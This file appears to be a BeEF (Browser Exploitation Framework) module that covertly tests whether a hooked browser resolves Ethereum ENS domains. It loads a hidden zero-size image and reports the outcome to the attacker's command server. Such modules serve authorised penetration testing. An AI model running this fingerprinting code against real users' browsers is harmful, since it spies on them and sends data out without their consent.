//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	if (document.getElementById('ethereum_ens_img_<%= @command_id %>')) {
		return "Img already created";
	}

	var img = new Image();
	img.setAttribute("style", "visibility:hidden");
	img.setAttribute("width", "0");
	img.setAttribute("height", "0");
	img.src = '<%= @ethereum_ens_resource %>';
	img.id = 'ethereum_ens_img_<%= @command_id %>';
	img.setAttribute("attr", "start");
	img.onerror = function() {
		this.setAttribute("attr", "error");
	};
	img.onload = function() {
		this.setAttribute("attr", "load");
	};

	document.body.appendChild(img);

	setTimeout(function() {
		var img = document.getElementById('ethereum_ens_img_<%= @command_id %>');	
		if (img.getAttribute("attr") == "error") {
      beef.debug('[Detect Ethereum ENS] Browser is not resolving Ethereum ENS domains.');
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is not resolving Ethereum ENS domains.');
		} else if (img.getAttribute("attr") == "load") {
      beef.debug('[Detect Ethereum ENS] Browser is resolving Ethereum ENS domains.');
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is resolving Ethereum ENS domains.');
		} else if (img.getAttribute("attr") == "start") {
      beef.debug('[Detect Ethereum ENS] Timed out. Cannot determine if browser is resolving Ethereum ENS domains.');
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Timed out. Cannot determine if browser is resolving Ethereum ENS domains.');
		};
		document.body.removeChild(img);
		}, <%= @timeout %>);

});
